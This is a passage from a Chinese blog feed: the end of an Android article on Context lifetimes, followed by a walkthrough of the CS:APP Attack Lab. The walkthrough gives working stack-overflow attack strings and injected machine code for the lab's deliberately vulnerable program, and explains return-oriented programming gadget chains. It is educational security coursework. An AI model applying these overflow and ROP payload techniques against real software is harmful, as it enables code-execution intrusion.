<h4 id="Activity-Service"><a href="#Activity-Service" class="headerlink" title="Activity/Service"></a><code>Activity</code>/<code>Service</code></h4><p>我们知道<code>Acitivity</code>类继承自<code>ContextThemeWrapper</code>，<code>ContextThemeWrapper</code>继承自<code>ContextWrapper</code>，最后<code>ContextWrapper</code>继承自<code>Context</code>。顾名思义，<code>ContextWrapper</code>与<code>ContextThemeWrapper</code>只是将<code>Context</code>进行了再次的包装，加入了更多的信息，同时对一些方法做了转发。</p>
<p>所以我们在<code>Activity</code>或<code>Service</code>中需要<code>Context</code>时就可以直接使用<code>this</code>，因为它们本身就是<code>Context</code>。</p>
<p>当系统创建一个新的<code>Activity</code>/<code>Service</code>实例时，它也会创建一个新的<code>ContextImpl</code>实例来封装所有的信息。</p>
<p><strong>对于每一个<code>Activity</code>/<code>Service</code>实例，它们的基础<code>Context</code>都是独立的。</strong></p>
<h4 id="Application"><a href="#Application" class="headerlink" title="Application"></a><code>Application</code></h4><p><code>Application</code>同样继承于<code>ContextWrapper</code>，但是<code>Application</code>本身是以单例模式运行在应用进程中的，它可以被任何<code>Activity</code>/<code>Service</code>用<code>getApplication()</code>或是被任何<code>Context</code>使用<code>getApplicationContext()</code>方法获取。</p>
<p><strong>不管使用什么方法去获取<code>Application</code>，获取的总是同一个<code>Application</code>实例。</strong></p>
<h4 id="BroadcastReciver"><a href="#BroadcastReciver" class="headerlink" title="BroadcastReciver"></a><code>BroadcastReciver</code></h4><p><code>BroadcastReciver</code>本身并不是一个<code>Context</code>或在内部保存了一个<code>Context</code>，但是系统会在每次调用其<code>onRecive()</code>方法时向它传递一个<code>Context</code>对象，这个<code>Context</code>对象是一个<code>ReceiverRestrictedContext</code>（接收器限定<code>Context</code>），与普通<code>Context</code>不同在它的<code>registerReceiver()</code>与<code>bindSerivce()</code>方法是被禁止使用的，这意味着我们不能在<code>onRecive()</code>方法中调用该<code>Context</code>的这两个方法。</p>
<p><strong>每次调用<code>onReceive()</code>方法传递的<code>Context</code>都是全新的。</strong></p>
<h4 id="ContentProvider"><a href="#ContentProvider" class="headerlink" title="ContentProvider"></a><code>ContentProvider</code></h4><p>它本身同样不是一个<code>Context</code>，但它在创建时会被赋予一个<code>Context</code>并可以通过<code>getContext()</code>方法获取。</p>
<p><strong>如果这个内容提供器运行在调用它的应用中，将会返回该应用的<code>Application</code>单例，如果它是由其他应用提供的，返回的<code>Context</code>将会是一个新创建的表示其他应用环境的<code>Context</code>。</strong></p>
<h3 id="使用Context时的陷阱"><a href="#使用Context时的陷阱" class="headerlink" title="使用Context时的陷阱"></a>使用<code>Context</code>时的陷阱</h3><p>现在我们知道<code>Context</code>的几种分类，其实上面的分类也就是我们获取它的方式。着重标出的内容说明了它们被提供的来源，也暗指了它们的生命周期。</p>
<p>我们常常会在类中保存对<code>Context</code>的引用，但是我们要考虑生命周期的问题：如果被引用的这个<code>Context</code>是一个<code>Acitivity</code>，<strong>如果存放这个引用的类的生命周期大于<code>Activity</code>的生命周期，那么<code>Activity</code>在停止使用之后还被这个类引用着，就会引致无法被GC，造成事实上的内存泄露。</strong></p>
<p>举一个例子，如果使用下面的一个单例来保存<code>Context</code>的引用来加载资源：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CustomManager</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> CustomManager sInstance;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> CustomManager <span class="title">getInstance</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (sInstance == <span class="keyword">null</span>) &#123;</span><br><span class="line">            sInstance = <span class="keyword">new</span> CustomManager(context);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> sInstance;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> Context mContext;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">CustomManager</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">        mContext = context;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段程序的问题在于不知道传入的<code>Context</code>会是什么类型的，可能在初始化的时候传入的是一个<code>Activity</code>/<code>Serivce</code>，那么几乎可以肯定的是，这个<code>Activity</code>/<code>Service</code>将不会在结束以后被垃圾回收。如果是一个<code>Activity</code>，那么这意味着与它相关联的<code>View</code>或是其他庞大的类都将留在内存中而不会被回收。</p>
<p>为了避免这样的问题，我们可以改正这个单例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CustomManager</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> CustomManager sInstance;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> CustomManager <span class="title">getInstance</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (sInstance == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">//Always pass in the Application Context</span></span><br><span class="line">            sInstance = <span class="keyword">new</span> CustomManager(context.getApplicationContext());</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> sInstance;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> Context mContext;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">CustomManager</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">        mContext = context;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们只修改了一处，第7行中我们使用<code>context.getApplicationContext()</code>这个方法来获取<code>Application</code>这个单例，而不是直接保存<code>context</code>本身，这样就可以保证不会出现某<code>context</code>因为被这个单例引用而不能回收的情况。而<code>Application</code>本身是单例这个特性保证了生命周期的一致，不会造成内存的浪费。</p>
<h3 id="为什么不总是使用application作为context"><a href="#为什么不总是使用application作为context" class="headerlink" title="为什么不总是使用application作为context"></a>为什么不总是使用<code>application</code>作为<code>context</code></h3><p>既然它是一个单例，那么我们为什么不直接在任何地方都只使用它呢？</p>
<p>这是因为各种<code>context</code>的能力有所不同：</p>
<p><img src="/images/context01.png" alt=""></p>
<p>（图片出处见文末）</p>
<p>对几个注解的地方作说明：</p>
<ol>
<li>一个<code>application</code>可以启动一个<code>activity</code>，但是需要新建一个<code>task</code>，在特殊情况下可以这么做，但是这不是一个好的行为因为这会导致一个不寻常的返回栈。</li>
<li>虽然这是合法的，但是会导致填充出来的<code>view</code>使用系统默认的主题而不是我们设置的主题。</li>
<li>如果接收器是<code>null</code>的话是被允许的，通常在4.2及以上的版本中用来获取一个粘性广播的当前值。</li>
</ol>
<p>我们可以发现与<code>UI</code>有关的操作除<code>activity</code>之外都不能完成，在其他地方这些<code>context</code>能做的事情都差不多。</p>
<p>但是我们回过头来想，这三个与<code>UI</code>相关的操作一般都不会在一个<code>activity</code>之外进行，这个特性很大程度上就是系统为我们设计成这样的，如果我们试图去用一个<code>Application</code>去显示一个<code>dialog</code>就会导致异常的抛出和应用的崩溃。</p>
<p>对上面的第二点再进一步解释，虽然我们可以使用<code>application</code>作为<code>context</code>去填充一个<code>view</code>，但是这样填充出的<code>view</code>使用的将会是系统默认的主题，这是因为只有<code>acitivity</code>中才会存有我们定义在<code>manifest</code>中的主题信息，其他的<code>context</code>将会使用默认的主题去填充<code>view</code>。</p>
<h3 id="如何使用正确的Context"><a href="#如何使用正确的Context" class="headerlink" title="如何使用正确的Context"></a>如何使用正确的<code>Context</code></h3><p>既然我们不能将<code>Activity</code>作为<code>context</code>保存在另外一个比该<code>Activity</code>生命周期长的类中，那么如果我们需要在这个类中完成与<code>UI</code>有关的操作（比如显示一个<code>dialog</code>）该怎么办？</p>
<p>如果真的遇到了这样的情况：我们不得不保存一个<code>activity</code>在一个比该<code>Activity</code>生命周期长的类中以进行<code>UI</code>操作，就说明我们的设计是有问题的，系统的设计决定了我们不应该去进行这样的操作。</p>
<p>所以我们可以得出结论：</p>
<p>我们应该在<code>Activity</code>/<code>Service</code>的生命周期范围内直接使用该<code>Activity</code>/<code>Service</code>作为<code>context</code>，在它们的范围之外的类，应该使用<code>Application</code>单例这个<code>context</code>（并且不应该出现<code>UI</code>操作）。</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://possiblemobile.com/2013/06/context/" target="_blank" rel="noopener">https://possiblemobile.com/2013/06/context/</a></p>
<p><a href="https://web.archive.org/web/20170621005334/http://levinotik.tumblr.com/post/15783237959/demystifying-context-in-android" target="_blank" rel="noopener">https://web.archive.org/web/20170621005334/http://levinotik.tumblr.com/post/15783237959/demystifying-context-in-android</a></p>
<p><a href="http://grepcode.com/file/repository.grepcode.com/java/ext/com.google.android/android/5.1.1_r1/android/app/ContextImpl.java?av=f" target="_blank" rel="noopener">http://grepcode.com/file/repository.grepcode.com/java/ext/com.google.android/android/5.1.1_r1/android/app/ContextImpl.java?av=f</a></p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>深入理解计算机系统（CS:APP) - Attack Lab详解</title>
    <url>/2017/07/18/CS_APP_AttackLab/</url>
    <content><![CDATA[<h2 id="Attack-Lab"><a href="#Attack-Lab" class="headerlink" title="Attack Lab"></a>Attack Lab</h2><p>实验代码见<a href="https://github.com/viseator/CS-APP-3e-labs" target="_blank" rel="noopener">GitHub</a></p>
<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p><code>Attack Lab</code>的内容针对的是<code>CS-APP</code>中第三章中关于程序安全性描述中的栈溢出攻击。在这个<code>Lab</code>中，我们需要针对不同的目的编写攻击字符串来填充一个有漏洞的程序的栈来达到执行攻击代码的目的，攻击方式分为代码注入攻击与返回导向编程攻击。本实验也是对旧版本中<code>IA32</code>编写的<code>Buffer Lab</code>的替代。</p>
<p>我们可以从<a href="http://csapp.cs.cmu.edu/3e/labs.html" target="_blank" rel="noopener"><code>CMU</code>的<code>lab</code>主页</a>来获取自学者版本与实验讲义(Writeup)，讲义中包含了必要的提示、建议与被禁止的操作，从这个<code>lab</code>开始之后的<code>lab</code>对讲义中内容的依赖还是很强的。</p>
<blockquote>
<p>  <strong>特别提示</strong> 本<code>lab</code>的自学者版本需要在运行程序时加上<code>-q</code>参数来避免程序向不存在的评分服务器提交我们的答案导致报错</p>
</blockquote>
<a id="more"></a>
<h3 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h3><p>讲义中首先给我们展示了导致程序漏洞的关键：<code>getbuf</code>函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">getbuf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[BUFFER_SIZE];</span><br><span class="line">    Gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>getbuf</code>函数在栈中申请了一块<code>BUFFER_SIZE</code>大小的空间，然后利用这块空间首地址作为<code>Gets</code>函数的参数来从标准输入流中读取字符。由于没有对读入字符数量的检查，我们可以通过提供一个超过<code>BUFFER_SIZE</code>的字符串来向<code>getbuf</code>的栈帧之外写入数据。</p>
<p>在代码注入攻击中就是利用函数返回时<code>RET</code>指令会将调用方在栈中存放的返回地址读入<code>IP</code>中，执行该地址指向的代码。栈溢出后，我们可以改写这个返回地址，指向我们同样存放在栈中的指令，以达到攻击的目的。</p>
<h3 id="第一部分：代码注入攻击"><a href="#第一部分：代码注入攻击" class="headerlink" title="第一部分：代码注入攻击"></a>第一部分：代码注入攻击</h3><h4 id="Level１"><a href="#Level１" class="headerlink" title="Level１"></a>Level１</h4><p>在这个等级中，我们不需要注入任何攻击代码，只需要更改<code>getbuf</code>函数的返回地址执行指定的函数<code>touch1</code>（该函数已经存在于程序中）。</p>
<p>那么我们需要做的就是将栈中存放返回地址的位置改为<code>touch1</code>函数的入口地址，问题在于我们如何将地址精确地写入到原来的地址的位置。</p>
<p>讲义给出了<code>getbuf</code>的调用函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"No exploit. Getbuf returned 0x%x\n"</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果攻击成功，我们不会执行到第五行，而是跳转到<code>touch1</code>中执行：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vlevel = <span class="number">1</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Touch1!: You called touch1()\n"</span>);</span><br><span class="line">    validate(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出上面的字符串代表我们攻击成功。</p>
<p>下面我们利用<code>objdump -d</code>命令将程序反汇编来查看<code>getbuf</code>函数的行为。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  4017ac:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  4017af:	e8 8c 02 00 00       	callq  401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  4017b9:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  4017bd:	c3                   	retq   </span><br><span class="line">  4017be:	90                   	nop</span><br><span class="line">  4017bf:	90                   	nop</span><br></pre></td></tr></table></figure>
<p>代码比较简单，在第2行中将<code>rsp</code>减了0x28，申请了一块28字节的空间，第3行将<code>rsp</code>赋给<code>rdi</code>就是空间的首地址，然后调用了<code>Gets</code>函数，<code>rdi</code>就是它的参数。到这里我们可以确定<code>BUFFER_SIZE</code>的大小为0x28（自学讲义中这个值是固定的，但是真正的实验中这个值是由服务器生成的）。换句话说，在0x28字节的栈被<code>Gets</code>函数写满之后，多出来的字符会被写入<code>getbuf</code>函数的栈外。我们用图来说明栈的结构：</p>
<p><img src="/images/attacklab01.png" alt=""></p>
<p>下面是低地址，上面是高地址，在<code>getbuf</code>函数申请的0x28字节内存之外的8个字节存放的就是<code>test</code>函数<code>call</code>指令后下一条指令的地址。</p>
<p>现在我们可以知道，我们需要用0x28字节来将栈填满，再写入<code>touch1</code>函数的入口地址，在<code>getbuf</code>函数执行到<code>ret</code>指令的时候就会返回到<code>touch1</code>中执行。</p>
<p>下面就要利用官方提供的<code>hex2raw</code>程序来帮助我们生成攻击字符串，这个程序将以空白字符隔开表示的字节转换成真正的二进制字节，注意这个程序只是原样地转换文件中的字符，所以字节序的问题是我们应该考虑的。</p>
<p>最终的答案如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">c0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
<p>可以看到前0x28个字节都使用0x00来填充，然后在溢出的8个字节中写入了<code>touch1</code>的首地址<code>0x4017c0</code>，注意字节序就可以了。</p>
<h4 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h4><p>这个等级中我们同样需要跳转到指定的函数<code>touch2</code>中，但是想要通过<code>touch2</code>需要我们进行一些操作，讲义中给出了<code>touch2</code>的代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span> </span>&#123;</span><br><span class="line">    vlevel = <span class="number">2</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Touch2!: You called touch2(0x%.8x)\n"</span>, val);</span><br><span class="line">        validate(<span class="number">2</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Misfire: You called touch2(0x%.8x)\n"</span>, val);</span><br><span class="line">        fail(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里<code>cookie</code>是服务器给我们的一个数值，存放在<code>cookie.txt</code>文件中，自学者材料中的这个值应该都是一样的。</p>
<p>可以看到<code>touch2</code>拥有一个参数，只有这个参数与<code>cookie</code>的值相等才可以通过这一等级。所以我们的目标就是让程序去执行我们的代码，设置这个参数的值，再调用<code>touch2</code>完成攻击。</p>
<p>首先要注意的是<code>touch2</code>的第一个参数存放在寄存器<code>rdi</code>中，我们就是要设置这个寄存器的值为<code>cookie</code>。</p>
<p>那么如何让程序去执行我们的代码呢？既然我们可以向栈中写入任意内容并且可以设置返回时跳转到的地址，那么我们就可以通过在栈中写入指令，再令从<code>getbuf</code>函数返回的地址为我们栈中指令的首地址，在指令中执行<code>ret</code>进行第二次返回，返回到<code>touch2</code>函数，就可以实现我们的目的。</p>
<p>所以我决定将指令写入到栈地址的最低处，然后在溢出后将地址设置为这个栈地址。我们能完成这个攻击的前提是讲义中已经告诉我们这个具有漏洞的程序在运行时的栈地址是固定的，不会因运行多次而改变，并且这个程序允许执行栈中的代码。</p>
<p>我们利用<code>gdb</code>在运行时查看栈地址：</p>
<p><img src="/images/attacklab02.png" alt=""></p>
<p>停在<code>getbuf</code>的这里，然后查看<code>rsp</code>指向的地址：</p>
<p><img src="/images/attacklab03.png" alt=""></p>
<p>可以看到首地址为<code>0x5561dc78</code>，顺便看到第6行也就是0x28个字节之后存放的原返回地址。</p>
<p>由于我们需要在注入的代码中再次返回，就需要将二次返回的地址同样存放在栈中，这里为了避免与我们注入的代码重叠，我选择将<code>touch2</code>地址放在<code>getbuf</code>函数栈的最后8字节中。</p>
<p>下面就要生成攻击字符串了，首先我们需要生成攻击代码。我们先将攻击代码用汇编指令的形式写出来：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">movq $0x59b997fa,%rdi # rdi &#x3D; cookie</span><br><span class="line">movq $0x5561dc98,%rsp # 将rsp设为存放在栈中的touch2地址的地址</span><br><span class="line">ret # 读取rsp指向的地址并跳转</span><br></pre></td></tr></table></figure>
<p>下面利用<code>gcc -c</code>命令将汇编语句编译成机器码，再<code>objdump -d</code>生成的文件就可以间接地看到最终的机器码。</p>
<p>将指令的机器码作为我们攻击字符串的开头，<code>touch2</code>的地址放在栈中第0x20-0x28位置，将栈的首地址放在栈外的8个字节，构成我们的攻击字符串：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 48 </span><br><span class="line">c7 c4 98 dc 61 55 c3 00</span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">ec 17 40 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
<h4 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h4><p>该等级同样让我们跳转到<code>touch3</code>函数中，不过<code>touch3</code>函数判断有所不同：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Compare string to hex represention of unsigned value */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">    <span class="comment">/* Make position of check string unpredictable */</span></span><br><span class="line">    <span class="keyword">char</span> *s = cbuf + <span class="built_in">random</span>() % <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(s, <span class="string">"%.8x"</span>, val);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span> </span>&#123;</span><br><span class="line">    vlevel = <span class="number">3</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Touch3!: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">        validate(<span class="number">3</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Misfire: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">        fail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>仔细阅读上面的代码，我们需要传入<code>touch3</code>的参数是一个字符串的首地址，这个地址指向的字符串需要与<code>cookie</code>的字符串表示相同。这里<code>cookie</code>的字符串表示是<code>cookie</code>:<code>0x59b997fa</code>的<code>ASCII</code>表示的字符串：<code>35 39 62 39 39 37 66 61 00</code>。</p>
<p>所以我们需要做的是将这串字符串放入栈中，并且将<code>rdi</code>的值置为字符串的首地址，再进行与上步类似的二次返回操作。</p>
<p>这里我们需要好好考虑目标字符串在栈中的位置，下面是最终结果中的栈结构，先放出来便于讲解。</p>
<p><img src="/images/attacklab04.png" alt=""></p>
<p>如果目标字符串存放的位置比<code>touch3</code>存放地址更低，在最终字符串对比的时候会发现<code>rdi</code>指向地址的内容发生了改变。分析原因，我们可以查看从<code>getbuf</code>返回到字符串比对过程中执行的指令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000004018fa &lt;touch3&gt;:</span><br><span class="line">  4018fa:	53                   	push   %rbx</span><br><span class="line">  .</span><br><span class="line">  .</span><br><span class="line">  .</span><br><span class="line">  401911:	e8 36 ff ff ff       	callq  40184c &lt;hexmatch&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">000000000040184c &lt;hexmatch&gt;:</span><br><span class="line">  40184c:	41 54                	push   %r12</span><br><span class="line">  40184e:	55                   	push   %rbp</span><br><span class="line">  40184f:	53                   	push   %rbx</span><br></pre></td></tr></table></figure>
<p>上面列出的这部分指令都会向栈中压入新的内容，由于栈向下增长，而<code>rsp</code>一开始的位置在<code>touch3</code>地址的下一个位置，压入的新内容会覆盖<code>touch3</code>地址以下的内容，如果把目标字符串放在这部分会导致内容在比较之前就被覆盖。</p>
<p>知道栈中应该存放的内容的结构，攻击字符串的编写就不再困难了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">48 c7 c7 90 dc 61 55 48 # mov    $0x5561dc90,%rdi mov    $0x5561dc88,%rsp ret 为寄存器赋值并返回</span><br><span class="line">c7 c4 88 dc 61 55 c3 00</span><br><span class="line">fa 18 40 00 00 00 00 00 # touch3地址</span><br><span class="line">35 39 62 39 39 37 66 61 # 目标字符串</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00 # 注入指令首地址</span><br></pre></td></tr></table></figure>
<h3 id="第二部分：返回导向编程攻击"><a href="#第二部分：返回导向编程攻击" class="headerlink" title="第二部分：返回导向编程攻击"></a>第二部分：返回导向编程攻击</h3><p>我们在第二部分中需要解决的同样是第一部分的后两个问题，只不过我们要采取不同的方式来进行攻击。</p>
<p>为什么我们之前采取的代码注入的攻击手段无法在这个程序中起作用呢？这是国因为这个程序对代码注入攻击采取了两种防护方式：</p>
<ul>
<li>栈随机化，使得程序每次运行时栈的地址都不相同，我们无法得知我们注入的攻击代码的地址，也无法在攻击代码中硬编码栈中的地址。</li>
<li>标记内存中的栈段为不可执行，这意味着注入在栈中的代码无法被程序执行。</li>
</ul>
<p>尽管这两种手段有效地避免了代码注入攻击，但是我们仍然可以找到方式让程序执行我们想要去执行的指令。</p>
<h4 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h4><p>现在我们无法使用栈来存放代码，但是我们仍可以设置栈中的内容。不能注入代码去执行，我们还可以利用程序中原有的代码，利用<code>ret</code>指令跳转的特性，去执行程序中已经存在的指令。具体的方式如下：</p>
<p>我们可以在程序的汇编代码中找到这样的代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400f15 &lt;setval_210&gt;:</span><br><span class="line">400f15: c7 07 d4 48 89 c7 movl $0xc78948d4,(%rdi)</span><br><span class="line">400f1b: c3 retq</span><br></pre></td></tr></table></figure>
<p>这段代码的本意是</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setval_210</span><span class="params">(<span class="keyword">unsigned</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *p = <span class="number">3347663060U</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样一个函数，但是通过观察我们可以发现，汇编代码的最后部分：<code>48 89 c7 c3</code>又可以代表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">movq %rax, %rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>这两条指令（指令的编码可以见讲义中的附录）。</p>
<p>第1行的<code>movq</code>指令可以作为攻击代码的一部分来使用，那么我们怎么去执行这个代码呢？我们知道这个函数的入口地址是<code>0x400f15</code>，这个地址也是这条指令的地址。我们可以通过计算得出<code>48 89 c7 c3</code>这条指令的首地址是<code>0x400f18</code>，我们只要把这个地址存放在栈中，在执行<code>ret</code>指令的时候就会跳转到这个地址，执行<code>48 89 c7 c3</code>编码的指令。同时，我们可以注意到这个指令的最后是<code>c3</code>编码的是<code>ret</code>指令，利用这一点，我们就可以把多个这样的指令地址依次放在栈中，每次<code>ret</code>之后就会去执行栈中存放的下一个地址指向的指令，只要合理地放置这些地址，我们就可以执行我们想要执行的命令从而达到攻击的目的。</p>
<p><img src="/images/attacklab05.png" alt=""></p>
<p>这样的一串以<code>ret</code>结尾的指令，被称为<code>gadget</code>。我们要攻击的程序中为我们设置了一个<code>gadget_farm</code>，为我们提供了一系列这样可以执行的攻击指令，同时我们也只被允许使用程序中<code>start_farm</code>与<code>end_farm</code>函数标识之间的<code>gadget</code>来构建我们的攻击字符串。</p>
<p>这种攻击方式被称为返回导向编程攻击。</p>
<h4 id="Level-2-1"><a href="#Level-2-1" class="headerlink" title="Level 2"></a>Level 2</h4><p>目的与之前的<code>Level 2</code>相同，我们需要为<code>rdi</code>赋上<code>cookie</code>值，再跳转到<code>touch2</code>函数执行，跳转到<code>touch2</code>只需要将<code>touch2</code>的入口地址放在最后一个<code>gadget</code>之后，在它的<code>ret</code>指令执行之后就会返回到<code>touch2</code>中。</p>
<p>下面就要利用已有的<code>gadget</code>为<code>rdi</code>赋上我们想要的值。这里我们要将一个特定的值写入<code>rdi</code>，但是我们只可以使用栈来存放这个数值，同时不知道栈的地址，这个时候我们可以想到使用<code>pop</code>指令令这个值从栈中弹出到寄存器中。</p>
<p>查看<code>gadget</code>中提供的我们可以执行指令。发现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000004019a7 &lt;addval_219&gt;: </span><br><span class="line">  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  4019ad:	c3                   	retq</span><br></pre></td></tr></table></figure>
<p>中最后的字节为<code>58 90 c3</code>，这个三个字节分别编码了三条指令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">popq %rax</span><br><span class="line">nop</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>这个<code>nop</code>在这里当然不影响，利用这个<code>pop</code>指令我们就可以把栈中存放的内容弹出到<code>rax</code>中。接下来我们需要的是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">movq %rax,%rdi</span><br></pre></td></tr></table></figure>
<p>这条指令，如果没有的话可以多传几次，正好我们发现了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000004019c3 &lt;setval_426&gt;: </span><br><span class="line">  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)</span><br><span class="line">  4019c9:	c3                   	retq</span><br></pre></td></tr></table></figure>
<p>中最后的字节<code>48 89 c7 90 c3</code>编码了这样的指令。</p>
<p>我们分别计算这些需要执行的<code>gadget</code>的指令地址，写成攻击字符串：</p>
